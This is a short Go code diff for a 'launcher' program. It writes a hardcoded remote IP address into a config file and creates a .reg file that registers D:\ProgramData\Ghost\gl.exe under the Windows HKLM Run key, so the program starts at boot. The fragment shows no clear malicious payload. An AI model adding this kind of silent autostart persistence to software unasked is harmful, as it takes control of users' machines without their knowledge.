@@ -15,6 +15,7 @@ import (
 var ip string
 
 func main() {
+	os.Chdir("D:\\ProgramData\\Ghost")
 	fmt.Println("Starting launcher")
 	if !Exists("launcher.ini") {
 		Write1("launcher.ini", "39.100.5.139")
@@ -34,7 +35,7 @@ func main() {
 
 	if len(os.Args) == 1 {
 		//写出reg文件
-		Write1("greg.reg", "Windows Registry Editor Version 5.00\n\n[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run]\n\"ghost\"=\"D:\\\\ProgramData\\\\Ghost\\\\lgl.bat\"\n\n")
+		Write1("greg.reg", "Windows Registry Editor Version 5.00\n\n[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run]\n\"ghost\"=\"D:\\\\ProgramData\\\\Ghost\\\\gl.exe\"\n\n")
 		Write1("lgl.bat", "title booting\n@echo off\nD:\ncd D:\\ProgramData\\Ghost\ngl.exe")
 		if !Exists("nowVer.txt") {
 			Write1("nowVer.txt", "0")
